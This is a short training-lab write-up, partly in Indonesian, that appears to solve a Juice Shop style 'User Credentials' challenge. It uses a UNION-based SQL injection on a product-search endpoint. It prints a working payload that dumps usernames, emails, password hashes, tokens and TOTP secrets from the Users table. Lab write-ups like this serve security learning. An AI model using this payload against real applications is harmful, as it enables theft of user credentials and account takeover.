# User Credentials

## Deskripsi
Retrieve a list of all user credentials via SQL Injection.

## Resource
https://portswigger.net/web-security/sql-injection/examining-the-database

https://portswigger.net/web-security/sql-injection/union-attacks

## Langkah - langkah
1. Cari schema untuk tabel `Users` (didapat dari soal `Database Schema`).
   <img width="1919" height="1140" alt="image" src="https://github.com/user-attachments/assets/59ac8d25-3050-4922-a6a8-ff5aee2ba325" />
   Ada 13 kolom, yaitu `id`, `username`, `email`, `password`, `role`, `deluxeToken`, `lastLoginIp`, `profileImage`, `totpSecret`, `isActive`, `createdAt`, `updatedAt`, `deletedAt`

2. Intercept request dengan endpoint `/rest/products/search?q=` untuk melakukan SQL injection, kemudian kirim ke repeater.
   <img width="1919" height="1136" alt="image" src="https://github.com/user-attachments/assets/651dfcb0-387b-44bc-bfe5-f3ed7fc748b8" />

3. Karena kolom untuk query filter produk jumlahnya 9, buat payload untuk mendapatkan seluruh data dari tabel `Users` dengan 9 kolom saja, yaitu `aaa'))+UNION+SELECT+username,email,password,role,deluxeToken,totpSecret,isActive,createdAt,updatedAt+FROM+Users--`
   <img width="1919" height="1133" alt="image" src="https://github.com/user-attachments/assets/0aa834c5-5c0c-4a38-b767-f12d3aace714" />

## Catatan
Karena schema table sudah ada dari soal lain, maka bisa digunakan untuk membuat payload tanpa harus menentukan tipe dan jumlah kolom terlebih dahulu.
